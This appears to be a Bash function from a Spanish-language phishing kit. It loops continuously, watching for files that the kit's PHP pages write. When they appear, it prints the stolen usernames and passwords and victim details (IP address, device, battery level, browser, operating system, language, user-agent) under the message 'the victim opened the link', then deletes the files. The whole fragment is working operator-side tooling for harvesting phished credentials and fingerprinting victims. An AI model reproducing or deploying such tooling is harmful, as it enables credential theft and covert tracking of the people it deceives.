esperando_credenciales(){

  while [ true ]; do

  #    usuarios
		
    if [ -f 'php/credentials.txt' ]; then
      user=$(grep -i "usuario" php/credentials.txt | cut -d ":" -f2)
      pass=$(grep -i "Contrasena" php/credentials.txt| cut -d ":" -f2)
      echo -e "\n\n [++] Usuario: ${user}"
      echo -e " [++] Contraseña: ${pass}\n"
      for ((x=1; x<=50; x=x+1)); do
	echo -ne "#"
      done
      rm -f php/credentials.txt
    fi

    #    credenciales

    if [ -f 'php/credentials2.txt' ]; then
      IP=$(grep -i "ip" php/credentials2.txt | cut -d ":" -f2 | cut -d ' ' -f 1-2)
      mobile=$(grep -i "user-agent" php/credentials2.txt | cut -d ":" -f2 | cut -d ")" -f1 | cut -d ";" -f3)
      android=$(grep -i "user-agent" php/credentials2.txt | cut -d ":" -f2 | cut -d ";" -f2 )
      bateria=$(grep -i "bateria" php/credentials2.txt | cut -d ":" -f2 | cut -d ' ' -f 1-2)
      navegador=$(grep -i "user-agent" php/credentials2.txt | cut -d ":" -f2 | cut -d ";" -f3 | cut -d " " -f2 | tr -d ' ')
      sistemaOperativo=$(grep -i "sistema" php/credentials2.txt | cut -d ":" -f2 | cut -d ' ' -f 1-2)
      arquitectura=$(grep -i "sistema" php/credentials2.txt | cut -d ":" -f 2 | cut -d " " -f 3 | tr -d " ")
      lenguaje=$(grep -i "lenguaje" php/credentials2.txt| cut -d ":" -f2)
      useragent=$(grep -i "user-agent" php/credentials2.txt | cut -d ":" -f2)
      
      echo ''
      for ((x=1; x<=50; x=x+1)); do
        echo -ne "#"
      done

      echo -e "\n\n [++] La victima accedió al link!"
      echo -e "\n [++] IP: ${IP}"
      echo -e " [++] Mobile: ${mobile}"
      echo -e " [++] Android: ${android}"
      echo -e " [++] Bateria: ${bateria}"
      echo -e " [++] Navegador: ${navegador}"
      echo -e " [++] Sistema Operativo: ${sistemaOperativo}"
      echo -e " [++] Arquitectura: ${arquitectura}"
      echo -e " [++] Lenguaje: ${lenguaje}\n"
      echo -e " [++] User-Agent: ${useragent}\n"
      
      for ((x=1; x<=50; x=x+1)); do 
	echo -ne "#"
      done

      rm -rf php/credentials2.txt
    fi
  done
}
